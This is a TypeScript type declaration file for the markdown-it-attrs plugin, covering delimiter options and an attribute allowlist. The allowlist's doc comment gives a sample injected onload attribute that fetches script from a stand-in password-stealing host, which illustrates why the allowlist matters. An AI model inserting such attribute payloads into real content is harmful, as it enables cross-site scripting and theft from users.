declare module "markdown-it-attrs" {
  import MarkdownIt from "markdown-it";

  export interface AttrsOptions {
    /**
     * To use different delimiters than the default, add configuration for `leftDelimiter` and `rightDelimiter`:
     *
     * ```javascript
     * md.use(attrs, {
     *   leftDelimiter: '[',
     *   rightDelimiter: ']'
     * });
     * ```
     *
     * Which will render
     *
     * ```javascript
     * # title [.large]
     * ```
     *
     * as
     *
     * ```javascript
     * <h1 class="large">title</h1>
     * ```
     *
     * @default {
     * @see {@link AttrsOptions.rightDelimiter}
     */
    leftDelimiter: string;
    /**
     * To use different delimiters than the default, add configuration for `leftDelimiter` and `rightDelimiter`:
     *
     * ```javascript
     * md.use(attrs, {
     *   leftDelimiter: '[',
     *   rightDelimiter: ']'
     * });
     * ```
     *
     * Which will render
     *
     * ```markdown
     * # title [.large]
     * ```
     *
     * as
     *
     * ```html
     * <h1 class="large">title</h1>
     * ```
     *
     * @default }
     * @see {@link AttrsOptions.leftDelimiter}
     */
    rightDelimiter: string;

    /**
     * A user may insert rogue attributes like this:
     *
     * ```markdown
     * ![](img.png){onload=fetch('https://imstealingyourpasswords.com/script.js').then(...)}
     * ```
     *
     * If security is a concern, use an attribute whitelist:
     *
     * ```javascript
     * md.use(markdownItAttrs, {
     *   allowedAttributes: ['id', 'class', /^regex.*$/]
     * });
     * ```
     *
     * Now only id, class and attributes beginning with regex are allowed:
     *
     * ```markdown
     * text {#red .green regex=allowed onclick=alert('hello')}
     * ```
     *
     * Output:
     *
     * ```html
     * <p id="red" class="green" regex="allowed">text</p>
     * ```
     *
     * @default []
     */
    allowedAttributes: string[];
  }

  const Attrs: MarkdownIt.PluginWithOptions<Partial<AttrsOptions>>;

  export default Attrs;
}
